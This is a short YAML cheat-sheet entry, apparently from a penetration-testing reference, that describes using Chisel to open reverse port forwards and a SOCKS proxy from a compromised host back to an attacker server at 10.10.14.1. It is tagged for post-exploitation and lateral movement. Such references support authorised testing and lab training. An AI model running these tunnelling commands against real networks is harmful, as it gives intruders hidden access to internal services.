---
description: |
  Create TCP tunnels and port forwards through a compromised host
  using Chisel. Useful for reaching internal services.

  Reference values:
    Attacker IP: 10.10.14.1
    Target Internal Port: 8080
command: |
  # On attacker — start server
  ./chisel server --reverse -p 8000

  # On target — reverse port forward
  ./chisel client 10.10.14.1:8000 R:8080:127.0.0.1:8080

  # On target — SOCKS proxy
  ./chisel client 10.10.14.1:8000 R:1080:socks
phase:
  - Post-Exploitation
  - Lateral_Movement
target_os:
  - Linux
  - Windows
services: []
ports: []
items:
  - Shell
techniques:
  - Port_Forwarding
  - Tunneling
network_position:
  - Internal
  - Local
references:
  - https://github.com/jpillora/chisel
---
